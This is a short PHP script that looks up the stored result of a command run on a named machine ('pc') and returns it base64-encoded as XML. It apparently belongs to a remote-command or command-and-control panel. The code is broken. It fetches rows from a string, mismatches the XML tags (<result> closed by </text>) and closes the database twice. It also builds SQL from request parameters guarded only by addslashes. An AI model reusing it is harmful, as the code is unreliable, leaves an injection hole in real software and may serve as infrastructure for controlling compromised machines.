<?php 
# Return result of a command. 
header('Content-Type: text/xml');
include("conn.php");
if(isset($_GET['pc'])) {
	$pc=addslashes(html_entity_decode($_GET['pc'])); 
	$cmd=addslashes(html_entity_decode($_GET['cmd']));
	$test = mysqli_query($bdd, "SELECT id, result FROM commands WHERE pc='$pc' AND cmd='$cmd' AND ok='1' LIMIT 1");	
	while($tabl=mysqli_fetch_array($test)){   
		$resultOfcmd = $tabl['result'];	
		}		
	if(empty($resultOfcmd)){
	}else {
		$resultOfcmd=base64_encode($resultOfcmd);
		#echo "$resultOfcmd" ;
		
		$xml="";
		echo "<statuses>";
while($tabl=mysqli_fetch_array($resultOfcmd)){   
	$xml .= '<status>';
	$xml .= '<result>'.$tabl['result'].'</text>';
	$xml .= '<id>'.$tabl['id'].'</id>';
	$xml .= '</status>';	
	}
echo $xml;
mysqli_close($bdd); 
$bdd->close();
echo "</statuses>";	
	}
}
?>